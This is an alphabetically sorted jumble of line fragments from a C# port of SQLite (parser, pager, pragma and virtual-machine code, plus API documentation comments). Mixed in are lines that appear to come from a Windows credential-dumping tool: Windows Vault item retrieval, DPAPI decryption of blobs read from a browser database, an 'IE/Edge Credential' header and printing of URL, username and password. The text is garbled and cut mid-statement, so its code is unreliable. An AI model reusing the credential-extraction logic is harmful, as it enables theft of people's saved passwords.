 will be closed immediately after reading the meta-value. 
 will be complete if the tests are run on both a little-endian and
 will be converted into a Noop.
 will be filled with 
 will be made to point to that subroutine.  The generation of the
 will be overwritten when the schema is next loaded. If it does not
 will be recorded in iCursor and iColumn.  There might not be any
 will be rolled back automatically.
 will be skipped automatically.  Pages are added to pDone as they
 will be skipped.  Out-of-range pages are also skipped.
 will be undefined.</dd>
 will become the new first trunk page in the free-list.
 will correspond to the common table.  We still need to check to make
 will defined to either 1 or 0.  One of the four will be 1.  The other
 will either invoke the busy callback (if there is one) or it will
 will fail because neither abc or def can be resolved.
 will go unissued. This might cause the application to wait
 will induce the first process to release its read lock and allow
 will jump to a subroutine at the end of the program.  Then we
 will likely be much smaller since nField will likely be less than
 will not be able to find the master-journal name to determine
 will not be able to read databases created by your custom library.
 will not be journaled. This saves IO.
 will not be reloaded becuase the db->init.busy flag is set. This
 will not bother to check for that condition.
 will not detect syntactically incorrect SQL.
 will not have called the xDisconnect() method on any virtual
 will not roll it back.
 will not work correctly.
 will only see elements that were inserted before the last change
 will open a journal file shortly after it is created in order to do
 will pick the one that involves the least amount of data conversion.
 will proceed and the system may remain deadlocked indefinitely.
 will refer to the first entry in the database table or index.
 will refer to the last entry in the database table or index.
 will require a journal playback.
 will result in [SQLITE_ERROR] being returned.
 will return -8.
 will return with an error.  SQLITE_IGNORE means that the SQL statement
 will run.
 will scan expressions looking for iParent references and replace
 will support two or more Win95 readers or two or more WinNT readers.
 will take responsibility for freeing the Table structure.
 will therefore be cheaper to scan to determine the query result.
 will unwind its stack and return an error.  The argument
 will unwind its stack and return an error. {H17014} The argument
 will work unless a transaction is started first:
 winMutexNotheld(p) )
 with 0.
 with 1 and going up to Vdbe.nMem.  Each register can store
 with OP_OpenRead or OP_OpenWrite to access database index pIdx.
 with a corrupt database.
 with a particular database identified by the second argument. {H11302} The
 with an SQLITE_ROW return code and it sets up the sqlite3_stmt
 with an out-of-memory error now.  Ticket 
 with any child or overflow pages need to be updated.  
 with any savepoints that are destroyed by this operation.
 with calls to sqlite3_column_bytes().
 with it under an EXCLUSIVE lock where we do not need to
 with root page iRoot that do not belong to either connection pBtree
 with some code of our own.
 with specialized memory allocation requirements.  This object is
 with the SQLITE_DEBUG flag.  {A17087} External mutex implementations
 with the [database connection] identified by the first argument
 with the first column.
 with the index.
 with the library instead of the header file.  Cautious programmers might
 with the makeDflt flag set.  If two different VFSes with the
 with the pager.  This might return NULL if the file has
 with the rest of the schema when it is required.
 with the underlying operating system.  Most SQLite builds come with a
 with this page cache after this function returns will likely
 with virtual tables.
 within a single call (unless an error occurs). The Debug.Assert() statement
 within a trigger is not seen outside the trigger.  Changes to views do not
 within an expression that is an argument to another macro
 within testcase() and assert() macros.
 within the call to [sqlite3_config].
 within the current transaction (i.e. if Pager.journalOff==0).
 within the database. So that they appear as part of the callers 
 within the output subroutine.  The regPrev register set holds the previously
 within this transaction will be opened as an in-memory file. This
 without changing anything.
 without effecting the originals.
 without most of the overhead of a full integrity-check.
 without notice.  These values are for testing purposes only.
 work around the pointer aliasing rules of C.)  
 work but it results in the same answer.
 work correctly but in fact be subtly malfunctioning.  Use of the
 work.
 working correctly.  This variable has no function other than to
 working in no-sync mode. This means that the rest of the journal
 works even if READ_UNCOMMITTED is set.
 works find if the following memset() is omitted.  But initializing
 works for 32-bit positive integers and which is optimized for
 worring about sub-dividing and re-hashing. 
 worry so much with race conditions.
 worrying about deadlock.
 would be mapped into integers 0 through 7.
 would be much more complicated.) 
 would generate warning messages when they were used.  But that
 would have looked like this:
 would map those cursor numbers into bits 0 through 5.
 wrFlag == 1)
 wrapper layer outside of the internal [sqlite3_exec()] call are not
 wrappers then we will get simulated malloc() failures within this
 wrflag != 0)
 writable return 0
 write a NULL.
 write return values.  Potential uses for xFileControl() might be
 write the result into register P3.
 write to the journal. TODO: Why handle temporary files differently
 write transaction must be started before any changes can be made to the
 write) 
 write.  The idea of a PENDING lock is to prevent new readers from
 writes that some Linux kernels offer floating point hardware
 writing if other conditions for writing are also met.  These
 writing this page to the database 
 writing to the database for an extended period of time.
 writing. The table is opened using cursor 0.
 written out.
 written to pPgnoNext. If page ovfl is the last page in its linked
 written to register P2.
 written to the destination [database connection].
 written to the transaction journal or the ckeckpoint journal
 written will be n-1 characters.
 wrong context.  The sqlite3_overload_function() API might construct
 wrong pages from the database.
 wrong.
 wrote>0
 wsdPrng.s[i] 
 x != null 
 x : (int)y
 x : y
 x < iFrom 
 x = x.next )
 x IN (...) 
 x IS NULL 
 x.Y >= 2038 )
 x.pSelect is valid (otherwise x.pList is) 
 x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 xA xB xC xD xE xF 
 x<EXPR and/or x>EXPR 
 x<EXPR or x<=EXPR constraint 
 x=EXPR or x IN (...) 
 x=EXPR or x IN (...) or x IS NULL 
 x=sqliteHashNext(x)){
 x>EXPR or x>=EXPR constraint 
 xAccess 
 xBegin method for that table.
 xBestIndex.
 xCachesize 
 xCheckReservedLock 
 xClose 
 xClose] method.  Cussors are used
 xCmp16.
 xCreate 
 xCurrentTime 
 xDel != SQLITE_DYNAMIC )
 xDelete 
 xDestroy 
 xDeviceCharacteristics 
 xDlClose 
 xDlError 
 xDlOpen 
 xDlSym 
 xFetch 
 xFileControl 
 xFileControl method for the [sqlite3_io_methods] object associated
 xFileControl method. {END}
 xFileSize 
 xFilename parameter is NULL it will also be the case that the
 xFilter as argv. Register P3
 xFilter method. Registers P3
 xFinalize 
 xFree argument when the memory allocation was made is invoked on the
 xFullPathname 
 xFunc 
 xGetLastError 
 xInit 
 xInit and xShutdown.
 xLock 
 xLock() increases the lock. xUnlock() decreases the lock.
 xMutexNotheld) implement the following interfaces (respectively):
 xOpen 
 xOpen flags 
 xOpen] method of the module and are destroyed
 xPagecount 
 xRandomness 
 xRead 
 xRekey 
 xScratchMalloc().  We verify this constraint in the single-threaded
 xSectorSize 
 xSectorSize( id ) : SQLITE_DEFAULT_SECTOR_SIZE )
 xShutdown 
 xSize should return the allocated size of a memory allocation
 xSleep 
 xStep 
 xStep != null ) ) 
 xStep == null ) ) 
 xSync 
 xTruncate 
 xTruncate() method to truncate it.
 xUnlock 
 xUnpin 
 xUnpin() is called by SQLite with a pointer to a currently pinned page
 xWrite 
 xtype == etEXP )
 years since 1900 
 yield X 
 you can remove the above 
 you try to truncate a file to some size that is larger than it
 yy_lookahead[i] != iLookAhead)
 yy_lookahead[i]!=iLookAhead ){
 yy_lookahead[j] == YYWILDCARD)
 yy_lookahead[yy_shift_ofst[S]
 yyerrorhit ){
 yygotominor.yy0.n = 0
 yygotominor.yy0.n = 1
 yygotominor.yy0.n=yymsp[0].minor.yy0.n
 yygotominor.yy0.z = null
 yygotominor.yy346.pExpr != null)
 yygotominor.yy378.b = null
 yygotominor.yy378.b = yymsp[0].minor.yy408
 yygotominor.yy429.mask = 0x000000
 yygotominor.yy429.mask = 0x0000ff
 yygotominor.yy429.mask = 0x00ff00
 yygotominor.yy429.mask = 0xff0000
 yygotominor.yy476.pLimit = yymsp[0].minor.yy346.pExpr
 yygotominor.yy476.pOffset = null
 yygotominor.yy476.pOffset = yymsp[0].minor.yy346.pExpr
 yygotominor.yy65.nSrc > 0)) yygotominor.yy65.a[yygotominor.yy65.nSrc - 1].jointype = (u8)yymsp[0].minor.yy328
 yygotominor.yy96.not = false
 yygotominor.yy96.not = true
 yymajor==0 ){
 yymsp[-1].minor.yy132 == null 
 yymsp[-1].minor.yy14.nExpr > pParse.db.aLimit[SQLITE_LIMIT_FUNCTION_ARG])
 yymsp[-2].minor.yy0.n == 0 
 yymsp[-7].minor.yy0 : yymsp[-6].minor.yy0)
 yymsp[0].minor.yy0.n
 yymsp[0].minor.yy0.z.Substring(yymsp[0].minor.yy0.n) : yymsp[-1].minor.yy0.z.Substring(yymsp[-1].minor.yy0.n)
 yymsp[0].minor.yy408 == null)
 yymsp[0].minor.yy429.value
 yypParser.yyidx > 0)
 yypParser.yyidx >= 0)
 yyruleno < yyRuleName.Length)
 yyruleno >= 0
 z != null 
 z == zName )//
 z > 126 ) zBuf.Append( '.' )
 z.Append( zTemp )
 z.Length
 z.Length == 0 )
 z.Length == iOffset 
 z.Length > iOffset 
 z1[i] 
 z<zTerm ){
 zAffinity[pD0] != '
 zArg.Length == 0 ) return
 zArg3 argument to authorization callbacks will be zContext until
 zArg[i] != 0 
 zB != null )
 zChild = 
 zCol column to be equal in the two tables pTab1 and pTab2.
 zColl != null )
 zDate[zIndex] - '0'
 zDate[zIndex] == '.' 
 zDate[zIndex] == ':' )
 zDb == null )
 zErrMsg = 0
 zFile.  The entry point is zProc.  zProc may be 0 in which case a
 zFilename 
 zFilename encoded in UTF-8 instead of UTF-16 
 zFilename is a temporary file 
 zFilename is the name of the database file.  If zFilename is NULL
 zFilename[0] ){
 zFormat and any string tokens that follow it are assumed to be
 zIdent[j] != '_' ) break
 zIdent[j] != 0 )
 zIdx < zSql.Length - 1 
 zIn.Length == 0 ) return 0
 zIn[i]
 zIn[i] 
 zIn[iz - 1] >= 0xC0 )
 zIn[zIndex
 zIndex < zDate.Length 
 zIndex < zDate.Length )
 zJournal
 zJournal 
 zLeft[a 
 zLeft[a] < 256 
 zMalloc
 zMaster must point to a buffer of at least nMaster bytes allocated by
 zMasterPtr = 0
 zMasterSchema and zInitScript are set to point at the master schema
 zMaster[0] != '
 zMaster[0] != 0 )
 zMaster[0] is set to 0 and SQLITE_OK returned.
 zMaster[nMaster] != 0 
 zMod[n]
 zName 
 zName != null )
 zName must be a pointer to a nul terminated string.
 zNew
 zNum is an unsigned number 
 zNum is empty or contains non-numeric text or is longer
 zNum[0] <= '9' )
 zNum[iZnum] == '0' ) iZnum
 zNum[i]<='9' )
 zPattern[0] != ']' 
 zPattern[0] != 0 
 zRandom.ToString() )
 zRec != null )
 zRec is set to be the complete text of the record if it is available.
 zRight != null )
 zRight ){
 zRight[b] < 256 
 zRight[b] < 256 ) return UpperToLower[zLeft[a]] - UpperToLower[zRight[b]]
 zSql string ends at either the first '
 zSql[nBytes - 1] != 0 ) )
 zSql[zIdx 
 zSql[zIdx] != '
 zSql[zIdx] != ']' ) { zIdx
 zSql[zIdx] != c ) { zIdx
 zStart==zNum) 
 zTName.Length == 0 ) )
 zTab != null 
 zTab == null 
 zTab == null )
 zTabName[0] != '
 zTempPath[i-1]=='
 zText[] encodes 801 bytes of keywords in 541 bytes 
 zType[0] != 'G' ) )
 zType[6]!=' ') ){
 zType[i
 z[0] <= '2' )
 z[cnt 
 z[i
 z[iOffset 
 z[iStart 
 z[i]
 z[iz] != '
 z[nByte 
 z[nByte] != 0 
 z[n] character is guaranteed to be something that does not look
 z[zDx] - '0'
 z[zDx] == 'E' )
 z[zIndex] == '
 z[zIndex] == ' ' ) zIndex
 z[zIndex] == '-' ) ) zIndex 
 z[zIndex] == '.' )
 z[zIndex] == 'E' ) )
 zero and return SQLITE_OK. The caller will call this function
 zero is returned.
 zero sized database has a header than consists entirely of zeroes.
 zero to read. non-zero to write. 
 zero.  This term is not useful for search.
 zeroed and SQLITE_OK returned. The rationale for this is that this
 zeros.
 {A13751}
 {H10266} Every value in SQLite has one of five fundamental datatypes:
 {H11301} The [sqlite3_file_control()] interface makes a direct call to the
 {H11306} If the second parameter (zDbName) does not match the name of any
 {H11332} The [sqlite3_reset(S)] interface resets the [prepared statement] S
 {H11334} If the most recent call to [sqlite3_step(S)] for the
 {H11336} If the most recent call to [sqlite3_step(S)] for the
 {H11338} The [sqlite3_reset(S)] interface does not change the values
 {H12601} The sqlite3_load_extension() interface attempts to load an
 {H12602} The entry point is zProc.
 {H12604} The sqlite3_load_extension() interface shall return
 {H12606} Extension loading must be enabled using
 {H12621} Call the sqlite3_enable_load_extension() routine with onoff==1
 {H12622} Extension loading is off by default.
 {H12641} This function registers an extension entry point that is
 {H12642} Duplicate extensions are detected so calling this routine
 {H12643} This routine stores a pointer to the extension in an array
 {H12644} Automatic extensions apply across all threads.
 {H12661} This function disables all previously registered
 {H12662} This function disables automatic extensions in all threads.
 {H17001} The xMutexInit routine shall be called by SQLite once for each
 {H17011} The sqlite3_mutex_alloc() routine allocates a new
 {H17015} The first two constants cause sqlite3_mutex_alloc() to create
 {H17017} The other allowed parameters to sqlite3_mutex_alloc() each return
 {H17018} Note that if one of the dynamic mutex parameters (SQLITE_MUTEX_FAST
 {H17019} The sqlite3_mutex_free() routine deallocates a previously
 {H17029} SQLite will never exhibit
 {H17031} The sqlite3_mutex_leave() routine exits a mutex that was
 {H17083} These routines should return true if the mutex in their argument
 {H17085} If the argument to sqlite3_mutex_held() is a NULL pointer then
 {X17084} The implementation is not required to provided versions of these
 }        
 }             
 }              //
 }   //
 } /
 } // TODO -- Convert to inline for speed
 } }
 }//
 }// (sqlite_u3264)0 )
 }// TODO -- Convert back to inline for speed
 }// sizeof( PCache )
 }// z[n - 1] = '
 }//Deephemeralize( pOut )
 }//p.aMem--
 }//z 
 }//zDate
 }else 
![](2.png)
"                                                                          pTab.aCol[pFK.aCol[j].iFrom].zName, 0 )"
"                                                                     ""wrong "
"                                                              [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,"
"                                                              [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,"
"                                                          addr = sqlite3VdbeAddOp1( v, OP_IfPos, 1 )"
"                                                          addr = sqlite3VdbeAddOpList( v, ArraySize( cntIdx ), cntIdx )"
"                                                          addr = sqlite3VdbeAddOpList( v, ArraySize( idxErr ), idxErr )"
"                                                          int addr = sqlite3VdbeAddOpList( v, ArraySize( setCookie ), setCookie )"
"                                                          int addr = sqlite3VdbeAddOpList( v, readCookie.Length, readCookie )"
"                                                          jmp2 = sqlite3VdbeAddOp3( v, OP_Found, j "
"                                                          sqlite3GenerateIndexKey( pParse, pIdx, 1, 3, true )"
"                                                          sqlite3VdbeAddOp2( v, OP_Halt, 0, 0 )"
"                                                          sqlite3VdbeAddOp2( v, OP_Integer, pIdx.tnum, 2 "
"                                                          sqlite3VdbeChangeP1( v, addr "
"                                                          sqlite3VdbeChangeP1( v, addr, iDb )"
"                                                          sqlite3VdbeChangeP2( v, addr "
"                                                          sqlite3VdbeChangeP3( v, addr "
"                                                          sqlite3VdbeChangeP4( v, addr "
"                                                          sqlite3VdbeJumpHere( v, addr "
"                                                          sqlite3VdbeJumpHere( v, addr )"
"                                                          sqlite3VdbeJumpHere( v, jmp2 )"
"                                                          sqlite3VdbeSetColName( v, 0, COLNAME_NAME, zLeft, SQLITE_TRANSIENT )"
"                                                          sqlite3VdbeSetNumCols( v, 1 )"
"                                                         IntPtr hImportKey,"
"                                                         IntPtr pbKeyObject,"
"                                                         [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,"
"                                                         byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB "
"                                                         int cbInput,"
"                                                         int cbKeyObject,"
"                                                         out IntPtr phKey,"
"                                                         sqlite3MPrintf( db, """
"                                                        addr = sqlite3VdbeAddOp1( v, OP_IfPos, 1 )"
"                                                        for ( j = 0, pIdx = pTab.pIndex "
"                                                        loopTop = sqlite3VdbeAddOp2( v, OP_Rewind, 1, 0 )"
"                                                        sqlite3OpenTableAndIndices( pParse, pTab, 1, OP_OpenRead )"
"                                                        sqlite3ResetInternalSchema( db, 0 )"
"                                                        sqlite3VdbeAddOp2( v, OP_AddImm, 2, 1 )"
"                                                        sqlite3VdbeAddOp2( v, OP_Halt, 0, 0 )"
"                                                        sqlite3VdbeAddOp2( v, OP_Integer, 0, 2 )"
"                                                        sqlite3VdbeAddOp2( v, OP_Integer, i, 1 )"
"                                                        sqlite3VdbeAddOp2( v, OP_Integer, j, 2 )"
"                                                        sqlite3VdbeAddOp2( v, OP_Integer, pTab.tnum, 2 "
"                                                        sqlite3VdbeAddOp2( v, OP_Next, 1, loopTop "
"                                                        sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 1 )"
"                                                        sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 8 )"
"                                                        sqlite3VdbeAddOp2( v, OP_String8, 0, 1 )"
"                                                        sqlite3VdbeAddOp4( v, OP_String8, 0, 3, 0, pFK.zTo, 0 )"
"                                                        sqlite3VdbeAddOp4( v, OP_String8, 0, 4, 0,"
"                                                        sqlite3VdbeAddOp4( v, OP_String8, 0, 6, 0, zOnUpdate, 0 )"
"                                                        sqlite3VdbeAddOp4( v, OP_String8, 0, 7, 0, zOnDelete, 0 )"
"                                                        sqlite3VdbeAddOp4( v, OP_String8, 0, 8, 0, ""NONE"", 0 )"
"                                                        sqlite3VdbeAddOp4( v, zCol != null "
"                                                        sqlite3VdbeChangeP4( v, -1, encnames[ENC( pParse.db )].zName, P4_STATIC )"
"                                                        sqlite3VdbeJumpHere( v, addr )"
"                                                        sqlite3VdbeJumpHere( v, loopTop )"
"                                                        sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""encoding"", SQLITE_STATIC )"
"                                                        sqlite3VdbeSetNumCols( v, 1 )"
"                                                        sqlite3VdbeUsesBtree( v, iDb )"
"                                                        zState = ""closed"""
"                                                      addr = sqlite3VdbeAddOp1( v, OP_IfPos, 1 )"
"                                                      addr = sqlite3VdbeAddOp1( v, OP_IsNull, 2 )"
"                                                      else if ( sqlite3StrICmp( zLeft, ""file_format"" ) == 0 )"
"                                                      else if ( sqlite3StrICmp( zLeft, ""reload_schema"" ) == 0 )"
"                                                      else if ( sqlite3_file_control( db, i != 0 "
"                                                      if ( sqlite3StrICmp( zLeft, ""schema_version"" ) == 0"
"                                                      sqlite3CodeVerifySchema( pParse, i )"
"                                                      sqlite3VdbeAddOp2( v, OP_Halt, 0, 0 )"
"                                                      sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 2 )"
"                                                      sqlite3VdbeAddOp2( v, OP_ResultRow, 2, 1 )"
"                                                      sqlite3VdbeAddOp3( v, OP_Concat, 4, 3, 2 )"
"                                                      sqlite3VdbeAddOp3( v, OP_IntegrityCk, 2, cnt, 1 )"
"                                                      sqlite3VdbeAddOp3( v, OP_Move, 2, 4, 1 )"
"                                                      sqlite3VdbeAddOp4( v, OP_String8, 0, 1, 0, db.aDb[i].zName, P4_STATIC )"
"                                                      sqlite3VdbeAddOp4( v, OP_String8, 0, 2, 0, zState, P4_STATIC )"
"                                                      sqlite3VdbeAddOp4( v, OP_String8, 0, 3, 0,"
"                                                      sqlite3VdbeChangeP5( v, (u8)i )"
"                                                      sqlite3VdbeJumpHere( v, addr )"
"                                                      string zState = ""unknown"""
"                                                    addr = sqlite3VdbeAddOpList( v, ArraySize( endCode ), endCode )"
"                                                    if ( sqlite3StrICmp( zLeft, ""encoding"" ) == 0 )"
"                                                    int i, j, addr, mxErr"
"                                                    sqlite3RegisterLikeFunctions( db, getBoolean( zRight ) )"
"                                                    sqlite3VdbeAddOp2( v, OP_Integer, mxErr, 1 )"
"                                                    sqlite3VdbeChangeP2( v, addr, -mxErr )"
"                                                    sqlite3VdbeChangeP4( v, addr "
"                                                    sqlite3VdbeJumpHere( v, addr "
"                                                    sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""database"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""id"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""integrity_check"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 1, COLNAME_NAME, ""seq"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 1, COLNAME_NAME, ""status"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 2, COLNAME_NAME, ""table"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 3, COLNAME_NAME, ""from"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 4, COLNAME_NAME, ""to"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 5, COLNAME_NAME, ""on_update"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 6, COLNAME_NAME, ""on_delete"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetColName( v, 7, COLNAME_NAME, ""match"", SQLITE_STATIC )"
"                                                    sqlite3VdbeSetNumCols( v, 1 )"
"                                                    sqlite3VdbeSetNumCols( v, 2 )"
"                                                    sqlite3VdbeSetNumCols( v, 8 )"
"                                                   sqlite3BtreeGetFilename( db.aDb[i].pBt ), 0 )"
"                                                  byte[] pbIV,"
"                                                  byte[] pbInput,"
"                                                  byte[] pbOutput,"
"                                                  if ( sqlite3StrICmp( zLeft, ""integrity_check"" ) == 0"
"                                                  if ( sqlite3StrICmp( zLeft, ""lock_status"" ) == 0 )"
"                                                  int cbIV,"
"                                                  int cbInput,"
"                                                  int cbOutput,"
"                                                  ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,"
"                                                  ref int pcbResult,"
"                                                byte[] pbIV, int cbIV,"
"                                                byte[] pbInput,"
"                                                byte[] pbOutput,"
"                                                if ( sqlite3StrICmp( zLeft, ""case_sensitive_like"" ) == 0 )"
"                                                int cbInput,"
"                                                int cbOutput,"
"                                                pTab = sqlite3FindTable( db, zRight, zDb )"
"                                                ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,"
"                                                ref int pcbResult,"
"                                                sqlite3VdbeAddOp2( v, OP_Integer, ( pIdx.onError != OE_None ) "
"                                                sqlite3VdbeAddOp2( v, OP_Integer, i"
"                                                sqlite3VdbeAddOp2( v, OP_Integer, i, 1 )"
"                                                sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 2 )"
"                                                sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 3 )"
"                                                sqlite3VdbeAddOp4( v, OP_String8, 0, 2, 0, pColl.zName, 0 )"
"                                                sqlite3VdbeAddOp4( v, OP_String8, 0, 2, 0, pIdx.zName, 0 )"
"                                               SQLITE_FCNTL_LOCKSTATE, ref j ) == SQLITE_OK )"
"                                              if ( sqlite3StrICmp( zLeft, ""foreign_key_list"" ) == 0 "
"                                              sqlite3ParserTrace( Console.Out, ""parser: "" )"
"                                              sqlite3ParserTrace( null, """" )"
"                                              sqlite3VdbeAddOp2( v, OP_Integer, i, 1 )"
"                                              sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 3 )"
"                                              sqlite3VdbeAddOp4( v, OP_String8, 0, 2, 0, db.aDb[i].zName, 0 )"
"                                              sqlite3VdbeAddOp4( v, OP_String8, 0, 3, 0,"
"                                              sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""seq"", SQLITE_STATIC )"
"                                              sqlite3VdbeSetColName( v, 1, COLNAME_NAME, ""name"", SQLITE_STATIC )"
"                                              sqlite3VdbeSetColName( v, 2, COLNAME_NAME, ""unique"", SQLITE_STATIC )"
"                                              sqlite3VdbeSetNumCols( v, 2 )"
"                                              sqlite3VdbeSetNumCols( v, 3 )"
"                                            if ( sqlite3StrICmp( zLeft, ""collation_list"" ) == 0 )"
"                                            sqlite3VdbeAddOp2( v, OP_Integer, cnum, 2 )"
"                                            sqlite3VdbeAddOp2( v, OP_Integer, i, 1 )"
"                                            sqlite3VdbeAddOp2( v, OP_Null, 0, 5 )"
"                                            sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 3 )"
"                                            sqlite3VdbeAddOp4( v, OP_String8, 0, 3, 0, pTab.aCol[cnum].zName, 0 )"
"                                            sqlite3VdbeAddOp4( v, OP_String8, 0, 5, 0, pCol.zDflt, 0 )"
"                                            sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""seq"", SQLITE_STATIC )"
"                                            sqlite3VdbeSetColName( v, 1, COLNAME_NAME, ""name"", SQLITE_STATIC )"
"                                            sqlite3VdbeSetColName( v, 2, COLNAME_NAME, ""file"", SQLITE_STATIC )"
"                                            sqlite3VdbeSetNumCols( v, 3 )"
"                                          if ( sqlite3StrICmp( zLeft, ""database_list"" ) == 0 )"
"                                          pTab = sqlite3FindTable( db, zRight, zDb )"
"                                          sqlite3VdbeAddOp2( v, OP_Integer, ( pCol.notNull != 0 "
"                                          sqlite3VdbeAddOp2( v, OP_Integer, i - nHidden, 1 )"
"                                          sqlite3VdbeAddOp2( v, OP_Integer, pCol.isPrimKey != 0 "
"                                          sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 6 )"
"                                          sqlite3VdbeAddOp4( v, OP_String8, 0, 2, 0, pCol.zName, 0 )"
"                                          sqlite3VdbeAddOp4( v, OP_String8, 0, 3, 0,"
"                                          sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""seqno"", SQLITE_STATIC )"
"                                          sqlite3VdbeSetColName( v, 1, COLNAME_NAME, ""cid"", SQLITE_STATIC )"
"                                          sqlite3VdbeSetColName( v, 2, COLNAME_NAME, ""name"", SQLITE_STATIC )"
"                                          sqlite3VdbeSetNumCols( v, 3 )"
"                                        ""ORDER BY 1"""
"                                        ""Safety level may not be changed inside a transaction"" )"
"                                        ""WHERE type = 'table'"" "
"                                        ""temp_store_directory"", SQLITE_STATIC )"
"                                        if ( sqlite3StrICmp( zLeft, ""index_list"" ) == 0 "
"                                        if ( sqlite3StrICmp( zLeft, ""parser_trace"" ) == 0 )"
"                                        pIdx = sqlite3FindIndex( db, zRight, zDb )"
"                                        sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""cid"", SQLITE_STATIC )"
"                                        sqlite3VdbeSetColName( v, 1, COLNAME_NAME, ""name"", SQLITE_STATIC )"
"                                        sqlite3VdbeSetColName( v, 2, COLNAME_NAME, ""type"", SQLITE_STATIC )"
"                                        sqlite3VdbeSetColName( v, 3, COLNAME_NAME, ""notnull"", SQLITE_STATIC )"
"                                        sqlite3VdbeSetColName( v, 4, COLNAME_NAME, ""dflt_value"", SQLITE_STATIC )"
"                                        sqlite3VdbeSetColName( v, 5, COLNAME_NAME, ""pk"", SQLITE_STATIC )"
"                                        sqlite3VdbeSetNumCols( v, 6 )"
"                                        sqlite3ViewGetColumnNames( pParse, pTab )"
"                                      if ( sqlite3StrICmp( zLeft, ""index_info"" ) == 0 "
"                                      pTab = sqlite3FindTable( db, zRight, zDb )"
"                                      sqlite3ErrorMsg( pParse, ""not a writable directory"" )"
"                                      sqlite3ErrorMsg( pParse,"
"                                    if ( sqlite3StrICmp( zLeft, ""table_info"" ) == 0 "
"                                    rc = sqlite3OsAccess( db.pVfs, zRight, SQLITE_ACCESS_READWRITE, ref res )"
"                                    returnSingleInt( pParse, ""synchronous"", pDb.safety_level - 1 )"
"                                    sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 1 )"
"                                    sqlite3VdbeAddOp4( v, OP_String8, 0, 1, 0, sqlite3_temp_directory, 0 )"
"                                    sqlite3VdbeSetColName( v, 0, COLNAME_NAME,"
"                                    sqlite3VdbeSetNumCols( v, 1 )"
"                                    sqlite3_temp_directory = """""
"                                  if ( flagPragma( pParse, zLeft, zRight ) != 0 )"
"                                  if ( sqlite3_temp_directory != """" )"
"                                //byte[] decPass = ProtectedData.Unprotect(encBlob, null, DataProtectionScope.CurrentUser)"
"                                Console.WriteLine("""
"                                byte[] encBlob = CSSQLite.sqlite3_column_blob(vm, i)"
"                                changeTempStorage( pParse, zRight )"
"                                if ( sqlite3StrICmp( zLeft, ""synchronous"" ) == 0 )"
"                                is NULL, the action is the same as ABORT."
"                                returnSingleInt( pParse, ""temp_store"", db.temp_store )"
"                              iAddr = sqlite3VdbeAddOpList( v, ArraySize( setMeta6 ), setMeta6 )"
"                              if ( sqlite3StrICmp( zLeft, ""temp_store_directory"" ) == 0 )"
"                              returnSingleInt( pParse, ""cache_size"", pDb.pSchema.cache_size )"
"                              sqlite3BtreeSetCacheSize( pDb.pBt, pDb.pSchema.cache_size )"
"                              sqlite3VdbeChangeP1( v, iAddr "
"                              sqlite3VdbeChangeP1( v, iAddr, iDb )"
"                              sqlite3VdbeChangeP2( v, iAddr "
"                              sqlite3VdbeUsesBtree( v, iDb )"
"                            //Console.WriteLine(""--- IE/Edge Credential ---"")"
"                            Console.WriteLine("""
"                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField(""pPackageSid"")"
"                            if ( sqlite3StrICmp( zLeft, ""temp_store"" ) == 0 )"
"                            int rc = sqlite3BtreeSetAutoVacuum( pBt, eAuto )"
"                            result = VaultCli.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem)"
"                            result = VaultCli.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem)"
"                            sqlite3PagerJournalMode( pPager, eMode )"
"                            throw new Exception(""Error occured while retrieving vault item. Error: 0x"" "
"                          SQLITE_CONSTRAINT, onError, regData "
"                          addr = sqlite3VdbeAddOp1( v, OP_IncrVacuum, iDb )"
"                          if ( sqlite3StrICmp( zLeft, ""cache_size"" ) == 0 )"
"                          int iLimit = 0, addr"
"                          rc = sqlite3BtreeFirst( pC.pCursor, ref res )"
"                          rc = sqlite3BtreeLast( pC.pCursor, ref res )"
"                          returnSingleInt( pParse, ""auto_vacuum"", auto_vacuum )"
"                          sqlite3BeginWriteOperation( pParse, 0, iDb )"
"                          sqlite3VdbeAddOp1( v, OP_ResultRow, 1 )"
"                          sqlite3VdbeAddOp2( v, OP_AddImm, 1, -1 )"
"                          sqlite3VdbeAddOp2( v, OP_IfPos, 1, addr )"
"                          sqlite3VdbeAddOp2( v, OP_Integer, iLimit, 1 )"
"                          sqlite3VdbeJumpHere( v, addr )"
"                         pTab->zName, sqlite3Strlen30(pTab->zName) "
"                        //Console.WriteLine(""{0} {1} {2}"", originUrl, username, password)"
